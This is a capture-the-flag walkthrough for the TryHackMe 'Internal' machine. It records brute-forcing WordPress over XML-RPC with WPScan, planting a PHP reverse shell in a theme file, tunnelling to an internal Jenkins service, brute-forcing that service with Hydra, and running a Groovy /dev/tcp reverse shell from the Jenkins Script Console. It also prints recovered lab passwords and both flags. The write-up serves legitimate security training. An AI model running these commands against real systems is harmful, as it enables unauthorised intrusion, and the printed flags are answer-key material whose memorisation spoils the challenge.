## About Internal

**Name:** Internal

**Room:** https://tryhackme.com/room/internal

**Difficulty:** Hard

**OS:** Linux

**Target IP:** `10.48.157.111`

---
## Recon

I'll start with an nmap scan to identify open ports, running services, and the operating system:

```
nmap -sC -sV -Pn -O 10.48.157.111 -oN Internal
```

The scan reveals just two open ports, `22` for SSH and `80` for HTTP. Since SSH needs valid credentials before it's of any real use, and we don't have any yet, so I'll start enumerating port 80.

![](Assets/Nmap.png)

Browsing to `http://10.48.157.111` just gives us the default Apache2 landing page, nothing custom, and nothing useful sitting in the page source either. So I move on to directory brute forcing, to see if there's something hidden behind that default page.

![](Assets/Default_Apache.png)

Using `ffuf` with a medium-sized wordlist, I enumerate hidden directories:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.48.157.111/FUZZ 
```

![](Assets/Directory_Burteforcing.png)

This turns up a `/blog/` directory, which hosts a completely different interface from the default Apache page, a strong sign that this is where the real application actually lives.

![](Assets/Interface.png)

Navigating to `http://10.48.157.111/blog/` reveals a WordPress-style site, and a bit more digging leads me to the login page at `http://internal.thm/blog/wp-login.php`.

![](Assets/login_page.png)

## Foothold

I try a few default and commonly used credentials against the login page, and this confirms that the username `admin` is valid, since the login form's error message gives it away even before I know the actual password.

![](Assets/admin.png)

To recover the password, I use `WPScan` to brute-force the `admin` account through WordPress's XML-RPC interface. XML-RPC is worth targeting specifically here, since it allows multiple login attempts to be bundled into a single request, which makes brute-forcing through it noticeably faster than hitting the normal login form directly:

```
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/
```

After waiting a few minutes, this successfully returns a valid password for the `admin` account.

![700](Assets/admin_password.png)

I log in with the recovered credentials, which takes me straight to the WordPress dashboard. A "Remind me later" prompt appears on first login, so I just dismiss it and move on.

![](Assets/Remind_me_later.png)

With dashboard access secured, my next goal is finding a way to execute code on the server. WordPress admins have access to `Appearance → Theme Editor`, which lets us directly edit the PHP files belonging to any installed theme, so this is a natural path toward getting a shell.

![](Assets/dashboard2.png)

To avoid corrupting the site's primary theme, I pick an inactive one instead, going with `Twenty Seventeen`.

![](Assets/theme.png)

I insert a PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), into that theme's `404.php` file.

![](Assets/payload.png)

After saving the file, I start a `netcat` listener on my attack machine and trigger the payload by browsing to:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

This returns a reverse shell connection, confirming a foothold on the target.

![](Assets/reverse-shell.png)

Navigating to the home directory, I find a user folder, but the current shell, which is running as the web server user, doesn't have the privileges needed to access its contents directly.

![](Assets/denied.png)

After spending roughly thirty minutes poking around manually, I run a broader search for text files across the filesystem instead, since config files, notes, and leftover credentials often end up sitting in plain `.txt` files:

```
find / -type f -name "*.txt" 2>/dev/null
```

![](Assets/txt2.png)

Reading through the results, one file reveals the credentials `aubreanna:bubb13guM!@#123`.

![](Assets/credentials2.png)

Switching to the `aubreanna` account with these credentials gives us access to the user flag: `THM{int3rna1_fl4g_1}`.

![700](Assets/user.txt.png)

## Privilege Escalation

Continuing enumeration under this user, I find a file named `jenkins.txt`, which points to a hidden service running internally on port `8080`, meaning it isn't reachable directly from my attack machine over the network.

![](Assets/hidden.png)

Since the Jenkins service isn't directly reachable, I set up an SSH local port forward to tunnel traffic from my attack machine through to the target's internal service:

```
ssh -L 1234:localhost:8080 aubreanna@10.48.157.111
```

With the tunnel in place, I can now access the Jenkins web interface locally at `http://127.0.0.1:1234`.

![](Assets/jenkins.png)

I then brute-force the Jenkins login form using `Hydra` to try and recover valid administrator credentials:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 1234 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
```

This returns valid credentials, `admin:spongebob`, which I use to log in successfully

![](Assets/creds.png)

With administrative access confirmed, I now have access to Jenkins's built-in Script Console at `http://127.0.0.1:1234/script`. Using this script console, I can run arbitrary commands, which functions essentially the same as having a web shell. I use the following script to get a reverse shell:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![](Assets/console.png)

Running this script gives us a reverse shell on my `netcat` listener. From here, I check `/opt` and find a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.

![](Assets/root.png)

I log in as `root` over SSH using these credentials, confirming full compromise of the machine and giving us access to the root flag: `THM{d0ck3r_d3str0y3r}`.

![](Assets/root.txt.png)

---
